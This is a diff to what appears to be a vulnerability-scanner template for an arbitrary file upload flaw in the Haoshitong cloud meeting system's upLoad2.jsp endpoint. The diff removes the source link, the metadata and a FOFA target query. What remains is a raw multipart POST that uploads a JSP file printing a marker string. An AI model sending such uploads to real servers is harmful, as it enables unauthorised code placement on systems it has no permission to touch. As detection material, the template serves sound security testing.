@@ -3,12 +3,8 @@ info:
   name: 好视通云会议 upLoad2.jsp 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ms1va9845amsx44g'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ms1va9845amsx44g
-    fofa: app:"好视通-云会议"
 http:
 - raw:
   - 'POST /fm/systemConfig/upLoad2.jsp HTTP/1.1
@@ -20,8 +16,6 @@ http:
     Accept-Encoding: gzip
 
 
-
-
     --1515df1sdfdsfddfs
 
 
@@ -29,8 +23,6 @@ http:
 
 
     Content-Type: application/octet-stream
-
-
 
 
     <% out.print("dudesuite"); %>
